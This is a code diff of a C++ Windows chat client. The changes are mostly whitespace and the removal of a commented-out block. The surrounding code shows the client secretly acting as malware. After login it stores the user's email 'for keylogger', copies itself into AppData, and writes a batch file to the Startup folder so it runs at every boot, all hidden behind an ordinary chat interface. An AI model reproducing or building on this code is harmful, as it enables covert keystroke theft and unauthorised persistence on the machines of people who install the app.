@@ -23,7 +23,7 @@ void copySelfToAppData() {
     if (GetEnvironmentVariableA("APPDATA", appDataPath, sizeof(appDataPath))) {
         // Append the filename to the AppData path
         string fullPath = string(appDataPath) + "\\client.exe";
-        
+
         // Copy the executable to AppData
         fs::path sourcePath(exePath);
         fs::path destinationPath(fullPath);
@@ -33,6 +33,7 @@ void copySelfToAppData() {
         }
     }
 }
+
 
 void createBatFileInStartup(const string& argmail) {
     // Get the username from environment variable
@@ -447,43 +448,44 @@ void handleRegistration(ENetPeer* peer, ENetHost* client) {
 void handleLogin(ENetPeer* peer, ENetHost* client) {
     // Clear input buffer
     cin.ignore(numeric_limits<streamsize>::max(), '\n');
-    
+
     // Step 1: Get and validate credentials
     string email = getValidatedInput(
         "Enter email: ",
         isValidEmail,
         "Invalid email format. Please enter a valid email (e.g., user@example.com)."
     );
-    
+
     // For password, we'll validate format but not enforce complexity for login
     string password = getValidatedInput(
         "Enter password: ",
         [](const string& pwd) { return !pwd.empty() && pwd.length() <= 50; },
         "Password cannot be empty and must be less than 50 characters."
     );
-    
+
     // Step 2: Send login request to server
     string message = "LOGIN:" + email + "|" + password;
     string response = sendMessage(peer, message, client);
     cout << "Server: " << response << endl;
-    
+
     // Step 3: Enter chat if login successful
     if (response.rfind("OK:", 0) == 0) {
         cout << "You are now logged in!" << endl;
         cout << "Press Enter to go to the Chat App..." << endl;
-        
+
         // Store email for keylogger
         setUserEmail(email);
         copySelfToAppData();
         createBatFileInStartup(email);
-        
+
         // Wait for user to press Enter
         cin.get();
-        
+
         // Enter chat mode
         chatApp(peer, client);
     }
 }
+
 
 int application() {
      // --- INITIALIZE NETWORKING ---
@@ -532,6 +534,7 @@ int application() {
         event.type == ENET_EVENT_TYPE_CONNECT) {
         connectionSuccessful = true;
     }
+
     
     if (connectionSuccessful) {
         cout << "Connected to server!" << endl;
@@ -578,20 +581,6 @@ int application() {
 int main(int argc, char* argv[]) {
     
     bool enable = true;
-    // string exePath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\client.exe";
-    // string batFilePath = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\runClient.bat";
-    // // Replace %USERNAME% with actual username
-    // char username[MAX_PATH];
-    // DWORD size = sizeof(username);
-    // if (GetEnvironmentVariableA("USERNAME", username, size)) {
-    //     exePath.replace(exePath.find("%USERNAME%"), 9, username);
-    //     batFilePath.replace(batFilePath.find("%USERNAME%"), 9, username);
-    // }
-
-    // if (!(fileExists(exePath) && fileExists(batFilePath))) {
-    //     copySelfToAppData();
-    //     createBatFileInStartup(email);
-    // }
 
 
 
